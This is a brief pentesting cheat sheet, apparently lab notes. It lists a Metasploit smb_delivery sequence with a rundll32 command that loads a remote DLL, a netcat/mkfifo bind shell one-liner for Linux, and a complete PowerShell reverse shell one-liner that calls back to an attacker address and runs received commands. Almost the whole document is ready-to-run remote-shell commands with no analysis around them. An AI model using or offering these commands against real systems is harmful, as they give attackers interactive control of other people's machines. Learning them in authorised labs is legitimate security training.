
# Metepreter (Windows)

```powershell
# attack host
msfconsole -q
use exploit/windows/smb/smb_delivery
set target 0
set SRVHOST <kali-IP>
exploit

# window (copy cmd from msfconsole output)
rundll32.exe \\10.10.14.3\lEUZam\test.dll,0
```

# Bind Shells

## Linux

```bash
# target bind shells
nc -lvnp 1337

rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l 10.129.41.200 7777 > /tmp/f
```

```bash
# connect from attack host to target
nc -nv 10.129.41.200 7777
```

# Reverse Shells

## Windows

```powershell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```